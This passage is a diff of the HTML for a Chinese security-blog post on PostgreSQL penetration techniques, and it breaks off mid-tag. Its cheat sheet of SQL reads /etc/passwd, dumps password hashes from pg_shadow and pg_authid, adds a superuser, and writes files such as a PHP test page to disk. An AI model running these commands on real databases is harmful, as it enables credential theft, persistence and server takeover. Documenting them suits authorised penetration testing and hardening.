@@ -1,224 +1,829 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>postgresql 另类渗透技巧 | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="常用基础命令1234567891011121314151617181920212223242526--查看数据库版本select version();select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);SELECT current_setting(&#x27;server_version_num&#x27;);--列目录select pg_ls_">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="catj">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="常用基础命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-- 查看数据库版本select version();select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);SELECT current_setti">
 <meta property="og:type" content="article">
 <meta property="og:title" content="postgresql 另类渗透技巧">
 <meta property="og:url" content="http://example.com/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="常用基础命令1234567891011121314151617181920212223242526--查看数据库版本select version();select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);SELECT current_setting(&#x27;server_version_num&#x27;);--列目录select pg_ls_">
-<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="my-blog">
+<meta property="og:description" content="常用基础命令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-- 查看数据库版本select version();select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);SELECT current_setti">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/postgrel1.png">
+<meta property="og:image" content="http://example.com/image/postgrel2.png">
+<meta property="og:image" content="http://example.com/image/postgrel3.png">
 <meta property="article:published_time" content="2023-06-06T03:31:03.000Z">
-<meta property="article:modified_time" content="2026-07-01T14:50:21.771Z">
-<meta property="article:author" content="John Doe">
+<meta property="article:modified_time" content="2026-07-01T17:46:09.096Z">
+<meta property="article:author" content="catj">
 <meta property="article:tag" content="postgresql">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/postgrel1.png">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>postgresql 另类渗透技巧 - my-blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 7.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main"><article id="post-postgresql 另类渗透技巧" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" class="article-date">
-  <time class="dt-published" datetime="2023-06-06T03:31:03.000Z" itemprop="datePublished">2023-06-06</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">攻防实战</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      postgresql 另类渗透技巧
-    </h1>
   
 
-      </header>
+  <header>
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="常用基础命令"><a href="#常用基础命令" class="headerlink" title="常用基础命令"></a>常用基础命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">--查看数据库版本</span><br><span class="line">select version();</span><br><span class="line">select pg_read_file(&#x27;PG_VERSION&#x27;, 0, 200);</span><br><span class="line">SELECT current_setting(&#x27;server_version_num&#x27;);</span><br><span class="line"></span><br><span class="line">--列目录</span><br><span class="line">select pg_ls_dir(&#x27;/etc&#x27;);</span><br><span class="line"></span><br><span class="line">--获取 pgsql 安装目录</span><br><span class="line">select setting from pg_settings where name = &#x27;data_directory&#x27;;</span><br><span class="line"></span><br><span class="line">--查找 pgsql 配置文件路径</span><br><span class="line">select setting from pg_settings where name=&#x27;config_file&#x27;;</span><br><span class="line"></span><br><span class="line">列出数据库</span><br><span class="line">SELECT datname FROM pg_database;</span><br><span class="line"></span><br><span class="line">--查看支持的语言</span><br><span class="line">select * from pg_language;</span><br><span class="line"></span><br><span class="line">--查看安装的扩展</span><br><span class="line">select * from pg_available_extensions;</span><br><span class="line"></span><br><span class="line">--查看服务器ip地址</span><br><span class="line">select inet_server_addr();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Forbiddena&#39;s Security Blog</strong>
+    </a>
 
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/" data-id="cmr2alwo00000iq7b7e8yefjh" data-title="postgresql 另类渗透技巧" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li></ul>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
 
-    </footer>
-  </div>
-  
-    
-  
-</article>
-
-
-</section>
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/">攻防实战</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/postgresql/" style="font-size: 10px;">postgresql</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
-          <li>
-            <a href="/2023/06/06/postgresql%20%E5%8F%A6%E7%B1%BB%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/">postgresql 另类渗透技巧</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
-  
-</aside>
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
   
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="postgresql 另类渗透技巧"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-06 11:31" pubdate>
+          2023年6月6日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.4k 字
+        
+      </span>
     
 
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          37 分钟
+        
+      </span>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">postgresql 另类渗透技巧</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="常用基础命令"><a href="#常用基础命令" class="headerlink" title="常用基础命令"></a>常用基础命令</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 查看数据库版本</span><br><span class="hljs-keyword">select</span> version();<br><span class="hljs-keyword">select</span> pg_read_file(<span class="hljs-string">&#x27;PG_VERSION&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>);<br><span class="hljs-keyword">SELECT</span> current_setting(<span class="hljs-string">&#x27;server_version_num&#x27;</span>);<br><br><span class="hljs-comment">-- 列目录</span><br><span class="hljs-keyword">select</span> pg_ls_dir(<span class="hljs-string">&#x27;/etc&#x27;</span>);<br><br><span class="hljs-comment">-- 获取 pgsql 安装目录</span><br><span class="hljs-keyword">select</span> setting <span class="hljs-keyword">from</span> pg_settings <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;data_directory&#x27;</span>;<br><br><span class="hljs-comment">-- 查找 pgsql 配置文件路径</span><br><span class="hljs-keyword">select</span> setting <span class="hljs-keyword">from</span> pg_settings <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;config_file&#x27;</span>;<br><br>列出数据库<br><span class="hljs-keyword">SELECT</span> datname <span class="hljs-keyword">FROM</span> pg_database;<br><br><span class="hljs-comment">-- 查看支持的语言</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pg_language;<br><br><span class="hljs-comment">-- 查看安装的扩展</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> pg_available_extensions;<br><br><span class="hljs-comment">-- 查看服务器ip地址</span><br><span class="hljs-keyword">select</span> inet_server_addr();<br><br><span class="hljs-comment">-- 查询用户管理员权限</span><br><span class="hljs-keyword">SELECT</span> current_setting(<span class="hljs-string">&#x27;is_superuser&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> usesuper <span class="hljs-keyword">FROM</span> pg_user <span class="hljs-keyword">WHERE</span> usename = <span class="hljs-built_in">CURRENT_USER</span>;<br><span class="hljs-keyword">SELECT</span> usename <span class="hljs-keyword">FROM</span> pg_user <span class="hljs-keyword">WHERE</span> usesuper <span class="hljs-keyword">IS</span> <span class="hljs-keyword">TRUE</span>;<br><br><span class="hljs-comment">-- 查询用户密码</span><br><span class="hljs-keyword">SELECT</span> usename, passwd <span class="hljs-keyword">FROM</span> pg_shadow;<br><span class="hljs-keyword">SELECT</span> rolname,rolpassword <span class="hljs-keyword">FROM</span> pg_authid;<br><br><span class="hljs-comment">-- 查询用户密码加密方式</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-type">name</span>,setting,source,enumvals <span class="hljs-keyword">FROM</span> pg_settings <span class="hljs-keyword">WHERE</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;password_encryption&#x27;</span>;<br><br><span class="hljs-comment">-- 查询当前用户</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">current_user</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">session_user</span>;<br><span class="hljs-keyword">SELECT</span> usename <span class="hljs-keyword">FROM</span> pg_user;<br><span class="hljs-keyword">SELECT</span> getpgusername();<br><br><span class="hljs-comment">-- 添加用户</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> testname <span class="hljs-keyword">password</span> <span class="hljs-string">&#x27;testpass&#x27;</span> <span class="hljs-keyword">superuser</span> <span class="hljs-keyword">createrole</span> <span class="hljs-keyword">createdb</span>;<br><span class="hljs-keyword">grant</span> postgres <span class="hljs-keyword">to</span> testname;<br><br><span class="hljs-comment">-- 修改用户密码</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> testname <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">PASSWORD</span> <span class="hljs-string">&#x27;new_password&#x27;</span>;<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="PostgrelSQL-读文件"><a href="#PostgrelSQL-读文件" class="headerlink" title="PostgrelSQL 读文件"></a>PostgrelSQL 读文件</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-keyword">select</span> pg_read_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">select</span> PG_READ_FILE($$<span class="language-ruby">/etc/passwd<span class="hljs-variable">$$</span></span>);<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd_test(output <span class="hljs-type">TEXT</span>);<br><span class="hljs-keyword">copy</span> cmd_test <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/etc/passwd&#x27;</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> cmd_test <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">--  方式三</span><br><span class="hljs-keyword">Select</span> lo_import(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>,<span class="hljs-number">12345678</span>);<br><span class="hljs-keyword">select</span> array_agg(b)::<span class="hljs-type">text</span>::<span class="hljs-type">int</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> encode(data,<span class="hljs-string">&#x27;hex&#x27;</span>)b,pageno <span class="hljs-keyword">from</span> pg_largeobject <span class="hljs-keyword">where</span> loid=<span class="hljs-number">12345678</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> pageno)a<br><br><span class="hljs-keyword">select</span> lo_import($$<span class="language-ruby">/etc/passwd<span class="hljs-variable">$$</span></span>,<span class="hljs-number">11111</span>);<br><span class="hljs-keyword">select</span> cast(encode(data,$$<span class="language-ruby">base64<span class="hljs-variable">$$</span></span>)<span class="hljs-keyword">as</span> <span class="hljs-type">integer</span>) <span class="hljs-keyword">from</span> pg_largeobject <span class="hljs-keyword">where</span> loid=<span class="hljs-number">11111</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="PostgrelSQL-写文件"><a href="#PostgrelSQL-写文件" class="headerlink" title="PostgrelSQL 写文件"></a>PostgrelSQL 写文件</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-comment">-- 方式一</span><br><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/1.php&#x27;</span>;<br><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> convert_from(decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/success.txt&#x27;</span>;<br><br><span class="hljs-comment">-- 方式二</span><br><span class="hljs-keyword">select</span> lo_from_bytea(<span class="hljs-number">12349</span>,<span class="hljs-string">&#x27;ffffffff0x&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12349</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><br><span class="hljs-keyword">select</span> lo_from_bytea(<span class="hljs-number">12350</span>,decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12350</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><br><span class="hljs-comment">-- 方式三</span><br><span class="hljs-keyword">select</span> lo_creat(<span class="hljs-number">24577</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject(loid, pageno, data) <span class="hljs-keyword">values</span> (<span class="hljs-number">24577</span>, <span class="hljs-number">0</span>, decode(<span class="hljs-string">&#x27;ZmZmZmZmZmYweA==&#x27;</span>, <span class="hljs-string">&#x27;base64&#x27;</span>));<br><span class="hljs-keyword">select</span> lo_export(<span class="hljs-number">24577</span>, <span class="hljs-string">&#x27;/tmp/success.txt&#x27;</span>);<br><br><span class="hljs-keyword">SELECT</span> lo_create(<span class="hljs-number">12345</span>);<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12345</span>, <span class="hljs-number">0</span>, decode(<span class="hljs-string">&#x27;6666&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> pg_largeobject <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12345</span>, <span class="hljs-number">1</span>, decode(<span class="hljs-string">&#x27;666666&#x27;</span>, <span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> lo_export(<span class="hljs-number">12345</span>, <span class="hljs-string">&#x27;/tmp/ffffffff0x.txt&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> lo_unlink(<span class="hljs-number">12345</span>);<br><br><span class="hljs-keyword">select</span> lo_create(<span class="hljs-number">11116</span>);<br><span class="hljs-keyword">select</span> lo_put(<span class="hljs-number">11116</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;dGVzdDEyM&#x27;</span>);<br><span class="hljs-keyword">select</span> lo_put(<span class="hljs-number">11116</span>,<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;zQ1Ng==&#x27;</span>);<br><span class="hljs-keyword">select</span> lo_from_bytea(<span 